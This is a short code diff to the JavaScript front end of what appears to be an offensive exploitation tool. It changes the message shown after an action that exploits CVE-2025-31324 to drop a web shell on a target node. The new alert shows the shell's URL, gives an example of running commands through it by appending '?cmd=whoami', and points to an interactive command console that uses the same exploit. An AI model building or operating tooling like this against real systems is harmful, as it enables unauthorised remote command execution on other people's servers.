@@ -1863,8 +1863,12 @@ async function ctxAction(action) {
       const r = await api('POST', `node/${sid}/exploit_cve_2025_31324`,
                           { mode: 'dropshell' });
       if (r && r.success) {
-        alert('Shell dropped:\n' + r.shell_url + '\n\nUse OS Terminal with ' +
-              'method "CVE-2025-31324" to run commands with captured output.');
+        alert('Shell dropped at:\n' + r.shell_url +
+              '\n\nDirect URL example — append ?cmd=<command>:\n' +
+              r.shell_url + '?cmd=whoami\n\n' +
+              'Or use the OS Command Terminal with method ' +
+              '"CVE-2025-31324 (Java unauth)" for an interactive console with ' +
+              'captured stdout.');
       } else {
         alert('Drop failed: ' + ((r && r.error) || 'unknown error'));
       }
